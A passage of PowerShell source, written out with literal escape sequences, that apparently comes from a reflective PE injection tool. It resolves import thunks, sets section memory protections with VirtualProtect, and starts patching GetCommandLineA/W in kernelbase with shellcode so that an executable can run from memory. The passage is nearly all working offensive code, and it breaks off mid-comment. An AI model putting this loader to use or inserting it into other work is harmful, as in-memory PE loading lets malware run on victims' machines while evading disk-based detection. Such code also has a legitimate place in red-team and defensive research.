\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($RemoteLoading -eq $true)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Write-Host \"DLL: $ImportDllPath, Proc: $ProcedureNamePtr\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($LoadByOrdinal)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Cleanup\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProcedureNamePtr = [IntPtr]::Zero\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Function Get-VirtualProtectValue\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SectionCharacteristics\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = 0x0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_EXECUTE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_READWRITE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_READONLY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0else\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $Win32Constants.PAGE_NOACCESS\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $ProtectionFlag\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Function Update-MemoryProtectionFlags\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$SectionSize = $SectionHeader.VirtualSize\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Test-MemoryRangeValid -DebugString \"Update-MemoryProtectionFlags::VirtualProtect\" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Success -eq $false)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Throw \"Unable to change memory protection\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE\n\t\t\t\u00a0\u00a0\u00a0#Returns an object with addresses to copies of the bytes that were overwritten (and the count)\n\t\t\t\u00a0\u00a0\u00a0Function Update-ExeFunctions\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Param(\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 0, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PEInfo,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 1, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 2, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[System.Object]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 3, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[String]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExeArguments,\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[Parameter(Position = 4, Mandatory = $true)]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ExeDoneBytePtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReturnArray = @()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[UInt32]$OldProtectFlag = 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"Kernel32.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($Kernel32Handle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"Kernel32 handle null\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(\"KernelBase.dll\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($KernelBaseHandle -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# throw \"KernelBase handle null\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$KernelBaseHandle = $Kernel32Handle;\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#################################################\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# \u00a0\u00a0\u00a0We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)\n\t\t\t\u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, \"GetCommandLineA\")\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, \"GetCommandLineW\")\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0throw \"GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)\"\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0#Prepare the 